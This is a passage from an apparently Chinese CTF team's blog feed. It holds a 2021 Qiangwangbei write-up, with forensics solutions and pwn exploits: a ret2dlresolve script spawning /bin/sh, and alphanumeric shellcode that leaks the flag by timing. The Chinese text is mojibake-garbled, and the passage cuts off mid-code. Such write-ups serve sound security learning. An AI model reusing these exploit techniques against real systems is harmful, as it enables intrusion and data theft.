¡å2å°æ—¶å¤ç°äº†å…¨éƒ¨çš„é¢˜ï¼Œè‡ªåŠ¨åŒ–æäº¤flagè„šæœ¬æ³¨é‡Šæ‰ä¸€è¡Œå°±å¥½äº†</p><p>ä»–ç°åœ¨éå¸¸éå¸¸è‡ªè´£</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å…¶å®å¹¶ä¸æ˜¯pwnå¸ˆå‚…ä¸€ä¸ªäººçš„è´£ä»»ï¼Œæˆ‘ä»¬å›¢é˜Ÿçš„é—®é¢˜è¿˜æ˜¯å¾ˆå¤§ã€‚</p><p>3web1pwnçš„é…ç½®å°±æŠŠé‡æ‹…å‹åœ¨äº†pwnå¸ˆå‚…èº«ä¸Š</p><p>è¿™æ¬¡æ¯”èµ›è¯´å®è¯é¢˜ç›®ä¸‹å‘æ—¶é—´æœ‰ç‚¹ä¸åˆç†</p><p>å¼€èµ›2web2pwnï¼Œ12:00ç«Ÿä¸Šäº†2pwnï¼Œ15:00ä¸Šäº†1web</p><p>è¯´å®è¯å°±ç®—12:00ä¸Š1web1pwnï¼Œå³webå¤š3å°æ—¶ï¼Œpwnå°‘3å°æ—¶ã€‚å’±ä»¬è¿˜æ˜¯æœ‰æœºä¼šçš„</p><p>å½“ç„¶å’±ä¸èƒ½æ€ªä¸»åŠæ–¹é—®é¢˜ï¼Œå’±ä»¬è‡ªèº«pwnè–„å¼±æ˜¯æ ¹æœ¬é—®é¢˜</p><hr><h2 id="å¯¹äºä¸‹å±Šçš„æƒ³æ³•"><a href="#å¯¹äºä¸‹å±Šçš„æƒ³æ³•" class="headerlink" title="å¯¹äºä¸‹å±Šçš„æƒ³æ³•"></a>å¯¹äºä¸‹å±Šçš„æƒ³æ³•</h2><p>è§‰å¾—å’±ä»¬å¯¹äºæ–°äººçš„åŸ¹å…»å‡ºç°äº†é—®é¢˜ï¼Œå·¥ä½œå®¤çš„ä½œé£æ…µæ‡’ã€‚</p><p>å¯¹äºæˆ‘ä»¬è¿™å±Šï¼Œè¿›å…¥åæ²¡æœ‰å†æ¬¡è€ƒæ ¸ï¼Œ8ä½å¸ˆå‚…æœ‰çš„æ ¹æœ¬å°±ä¸å†å­¦ä¹ æŠ€æœ¯äº†</p><p>æ’é™¤èµ°æ–‡è‰ºè·¯çº¿ï¼ŒéæŠ€æœ¯è·¯çº¿ï¼Œæˆ‘ä»¬å¹³æ—¶çš„æŠ€æœ¯æå‡å…¨é è‡ªå·±è‡ªè§‰</p><p>å¯¹äº20å±Šï¼Œæˆ‘ä»¬åº”è¯¥é™¤äº†æ³¨é‡è‡ªèº«çš„æŠ€æœ¯æˆé•¿ï¼Œä¹Ÿè¦å…³æ³¨å­¦å¼Ÿå­¦å¦¹ä»¬çš„åŸ¹å…»</p><p>æˆ‘ä»¬å·¥ä½œå®¤å·²ç»æœ‰æ–­ä»£çš„è¿¹è±¡äº†ï¼Œè¿™æ¬¡æ¯”èµ›ä½“ç°äº†å‡ºæ¥ï¼Œæ˜å¹´å¯èƒ½ä¼šæ›´åŠ ä¸¥é‡</p><p>å’±å¸Œæœ›å°±ç®—ä»å¤´åšèµ·ï¼Œä¹Ÿä¸å¸Œæœ›è¾œè´Ÿå‰é¢å¸ˆå‚…ä»¬æ‰“ä¸‹çš„åŸºçŸ³</p><p>å°±è¿™æ ·å§</p><p>2021å¹´6æœˆ22æ—¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021å¼ºç½‘æ¯</title>
      <link href="article/2021qwb/"/>
      <url>article/2021qwb/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š"><a href="#ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š" class="headerlink" title="ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š"></a>ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š</h1><p>æˆ˜é˜Ÿåç§°ï¼šæˆ‘æ˜¯èœé¸¡QAQ</p><p>æˆ˜é˜Ÿæ’åï¼š68å</p><h1 id="äºŒã€è§£é¢˜æƒ…å†µ-ï¼š"><a href="#äºŒã€è§£é¢˜æƒ…å†µ-ï¼š" class="headerlink" title="äºŒã€è§£é¢˜æƒ…å†µ ï¼š"></a>äºŒã€è§£é¢˜æƒ…å†µ ï¼š</h1><img src="/article/2021qwb/image.png" class="" title="image" loading="lazy"><h1 id="ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š"><a href="#ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š" class="headerlink" title="ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š"></a>ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="ISO1995-SOLVED-ï½œ-D0gekong"><a href="#ISO1995-SOLVED-ï½œ-D0gekong" class="headerlink" title="ISO1995 | SOLVED ï½œ D0gekong"></a>ISO1995 | SOLVED ï½œ D0gekong</h2><p>æ‹¿åˆ°æ–‡ä»¶æ”¾è¿›kailç”¨fileå¯ä»¥çœ‹å‡ºæ˜¯ä¸€ä¸ªdebiançš„ç£ç›˜æ–‡ä»¶ï¼Œç”¨binwalkå¯ä»¥åˆ†ç¦»å‡ºä¸€ä¸ªisoæ–‡ä»¶ï¼Œç”¨ultraisoæ‰“å¼€isoæ–‡ä»¶ï¼Œå°†é‡Œé¢çš„æ–‡ä»¶æå–å‡ºæ¥</p><p>æå–å‡ºæ¥å¯å‘ç°æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚çš„æ–‡æœ¬</p><img src="/article/2021qwb/thumbnail.png" class="" title="thumbnail" loading="lazy"><p>ç”¨batchæ‰¹å¤„ç†å‘½ä»¤æ‹¼æ¥å¯å¾—åˆ°ä»¥ä¸‹æ–‡æœ¬</p><pre class="language-none"><code class="language-none">!&#x3D;gF~B.@YBO1.%DYzbA-1]&#125;jH&amp;@ ,K[7t&#x2F;LOi*5b)L &#39;&lt;pw&#39;am\W4LH@\toGKE1f &quot;oDWOaf2&#123;1&#123;w_ov-m:af8A044iCT_+ $w3cz(L0O)L_-s8&#39;_&lt;Ic &#x2F;KFP9vrr~6\ni&#123;~#g5cs#7z2S++Y1BbYQV&#39;is1&#x3D;DZ_| 3T1QxWEwX]&#125;NS@_3SdKK]91b?s-rs6g0QwBs @4#5TGxw#&amp;4ArDw~_X&quot;!._IAo&#96;&#39;xso&#39;.s5)+c9RU&#39; &#x2F;%_b[rjioPOy!&amp;&#x2F;)wjKR#å·¥jih0&#39;\,Dr! &amp;PHNf%, YOWEJ(2wXj&#x2F;u~1@gh%&amp;_6z5U~A&#x3D;OpAV$E&#x2F; &gt;1Kg:@4tS:V4ZB&#96;1_x*.17B&amp;:&lt;XnOrw| 2TY_DSN&lt;zvbKCj7+6w&#39;r&#125;Lo8&#39;:fYC@Fv102vbo)noQ1MT3#AZ+]U3##P|w&#123;V&gt;z,G5[s r&#x2F;Ra~p&#39;&gt;o0Y]&#123;0&#123;8&quot;oh&#x3D;vG*S82KoNt17|,*r#d!&#x3D;N&#39;%0$1Tron:7&#125;6c(yVSIZmtw8xza]6D ,nn*q&amp;KHNK,PW .b&lt;h E$)&#123;Kw_)h ,&#x3D;m41LAv&#39;f61:T xN:4z0&#123;&gt;&amp;F5(cRg| :M9RVX$,8&#x2F;1vq-][?a&#x2F;H)1&quot;x; ((,NZ(&#x3D;wJ4o&lt;&#x2F;_8.D9Q8~t&quot;aA:RNTXpSC8LKW+Pfgw&lt;NTqmy_8G6Np%c-9tAG-em&amp;]1IYtz\12a1KD&amp;z&lt;k &#39;w7HFr--py2uH&#x3D;;37*iuisp39+m ;&quot;1:xPJBC*LB8;x*?G. &#39; &#96;nA[PibSKN&gt;RFG#vDrw7k@QcOebUkG,~fvtxH [w&lt;f:e]mcbx,Yi6KcZ~å…«VHLR,t&#123;F&#x3D;&#125;gTKX&amp;;A_Fv1b,DeZJ1N]6q)76a]Us&#x3D;\u8tY;t*#]zSGo~-h64&#x3D;u2bGZ)1(&amp;%K68a!nQke&amp;+gX&#x3D;L4TmMy$5nHC&amp;+#&lt;486HKF4f0d%1?I:1&#x3D;M[p~DXELtCKh\&gt;4&lt;Qf+cj?a3pOF~4*-9%7*&lt;~&#39; +KkQ&lt;*z9oUgrgo$:NC.Di&lt;.$&#96;s+69Pn7:TgO~A\TKn |Q&#39;G&amp;9TX-@!6w&lt;VK_5tH&#x2F;#i&gt;$7SKKH[Dki-o&#123;b&#123;?j?4.ZW+aV! |zi&#123;2oTqk*#! o0h$-6oCbPpazbPfi</code></pre><p>ç„¶åæŠŠisoæ”¾è¿›010é‡Œï¼Œæœç´¢FFFF,å‘ç°FFFFåé¢çš„ä¸¤å­—èŠ‚æ¯ä¸ªéƒ½ä¸ä¸€æ ·çŒœæµ‹æœ‰è¹Šè··ï¼Œç”¨è„šæœ¬æå–å‡ºæ¥</p><p>è„šæœ¬é™„ä¸Šï¼š</p><pre class="language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"iso1995.iso"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\xff\xff\xff\xff"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        temp <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>index<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        result <span class="token operator">+=</span> temp        data <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">import</span> structbase <span class="token operator">=</span> <span class="token string">"iso1995/flag_f"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base <span class="token operator">+</span> name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>            result <span class="token operator">+=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>å¯å¾—åˆ°ä»¥ä¸‹æ–‡æœ¬ï¼Œåœ¨é‡Œé¢æ‰¾åˆ°flag</p><p>FLAG{Dir3ct0ry_jYa_n41}</p><h2 id="EzTime-SOLVED-ï½œ-D0gekong"><a href="#EzTime-SOLVED-ï½œ-D0gekong" class="headerlink" title="EzTime | SOLVED ï½œ D0gekong"></a>EzTime | SOLVED ï½œ D0gekong</h2><p>è§£å‹å¾—åˆ°æ–‡ä»¶</p><p>ç›´æ¥ç”¨ntfs log trackerå·¥å…·ä¸€æŠŠæ¢­</p><p>æ ¹æ®é¢˜ç›®æç¤ºå‘ç°æœ‰å¾ˆå¤šè·Ÿflagç›¸ä¼¼çš„æ–‡æœ¬</p><p>ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼Œæœ€åå‘ç°flagæ˜¯{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png</p><h2 id="BlueTeaming-SOLVEDï½œHn13"><a href="#BlueTeaming-SOLVEDï½œHn13" class="headerlink" title="BlueTeaming | SOLVEDï½œHn13"></a>BlueTeaming | SOLVEDï½œHn13</h2><p>è§£å‹æ–‡ä»¶å¯å¾—memory.dmp,é€šè¿‡volatilityçš„dumpå£ä»¤å°†æ³¨å†Œè¡¨ç»™æå–å‡ºæ¥æ”¾å…¥windows registry recoveryæŸ¥çœ‹æ³¨å†Œè¡¨</p><p>æŸ¥é˜…è·¯å¾„ç¿»åˆ°HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communicationé‡Œæœ‰powerÂ shellÂ è„šæœ¬Â </p><p>åˆ°åé¢æ‰æ„è¯†åˆ°è¿™å°±æ˜¯</p><p>flag:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</p><h2 id="CipherMan-SOLVED-Hn13"><a href="#CipherMan-SOLVED-Hn13" class="headerlink" title="CipherMan | SOLVED |Hn13"></a>CipherMan | SOLVED |Hn13</h2><p>è§£å‹æ–‡ä»¶ï¼Œæ‰“å¼€ä¸¤ä¸ªå·å‘ç°é‡Œé¢çš„secretéœ€è¦å…ˆè·å–å¯†ç æ‰èƒ½è§£å¼€åˆ†åŒº.</p><p>ç”±ç»™å‡ºçš„å†…å®¹å¯çŸ¥ï¼Œå¯†ç åº”è¯¥æ”¾åœ¨memoryä¸­ï¼Œç»“åˆfilescanä»¥åŠgrepå‘ç°ä¸¤ä¸ªæ–‡ä»¶</p><p>å¯¼å‡ºæ¥æ˜¯è¿™æ ·</p><p>221628-533357-667392-449185-516428-718443-190674-375100ä¸ºè§£å¯†å¯†é’¥</p><p>è¾“å…¥å¯†é’¥æ‰“å¼€åæœ‰ä¸ªreadmeæ–‡ä»¶ï¼Œæ‰“å¼€å°±æ˜¯flag</p><p>flagï¼šWow,Â youÂ haveÂ aÂ greatÂ ability.Â HowÂ didÂ youÂ solveÂ this?Â AreÂ youÂ aÂ hacker?Â PleaseÂ giveÂ meÂ aÂ lessonlater.</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h1><h2 id="å¼ºç½‘å…ˆé”‹-on-output-SOLVED-winter"><a href="#å¼ºç½‘å…ˆé”‹-on-output-SOLVED-winter" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]on output| SOLVED |winter"></a>[å¼ºç½‘å…ˆé”‹]on output| SOLVED |winter</h2><p>è§¦å‘å°±èƒ½æœ‰å¦‚ä¸‹çš„æº¢å‡º</p><p>ç›´æ¥è§¦å‘ä¿¡å·å¾—åˆ°æº¢å‡ºè¿›è¡Œret2_dl_runtime_resolveå°±è¡Œäº†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token comment">#p = process("./test")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.138.97'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x30</span>src <span class="token operator">=</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">0x20</span>s<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>s<span class="token punctuation">(</span>src<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"hello_boy\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0x4c</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h2 id="Shellcode-SOLVED-H3h3QAQ"><a href="#Shellcode-SOLVED-H3h3QAQ" class="headerlink" title="Shellcode | SOLVED | H3h3QAQ"></a>Shellcode | SOLVED | H3h3QAQ</h2><p>Readå’Œmmapæ²¡æœ‰è¢«ç¦ã€‚</p><p>å…ˆmmapå‡ºä¸€ç‰‡ç©ºé—´ï¼Œç„¶ååˆ‡æ¢ä½æ•°ï¼Œå†æ¬¡read shellcodeï¼Œå†æŠŠflagè¯»å…¥å†…å­˜ï¼Œå¾ªç¯ç”¨cmpä¸€ä½ä¸€ä½åˆ¤æ–­ï¼Œæœ€åæ‹¼æ¥å¾—åˆ°flagã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.137.118'</span><span class="token punctuation">,</span> <span class="token number">50050</span><span class="token punctuation">)</span>        <span class="token comment">#p=process('./shellcode')</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h2 id="Baby-diary-SOLVED-NN"><a href="#Baby-diary-SOLVED-NN" class="headerlink" title="Baby_diary| SOLVED | NN"></a>Baby_diary| SOLVED | NN</h2><p>è¾“å…¥å‡½æ•°å­˜åœ¨off by oneæ¼æ´</p><p>ç”±äºè¦ç»•è¿‡æ£€æŸ¥ï¼Œæˆ‘ä»¬åˆ©ç”¨largebinçš„æ®‹ç•™æ•°æ®ä¼ªé€ chunkï¼Œå†é€šè¿‡off by oneæ”¹inuseä½ï¼Œå®ç°unlinkï¼Œè¿™é‡Œéœ€è¦æ”¹ä¸€ä¸‹fdï¼Œç”±äºè¾“å…¥å‡½æ•°ä¼šæ”¾â€˜\x00â€™ï¼Œè¿™é‡Œè¦çˆ†ç ´ä¸€ä¸‹ï¼Œåé¢å°±æ˜¯leakå’Œæ‰“freehookäº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token 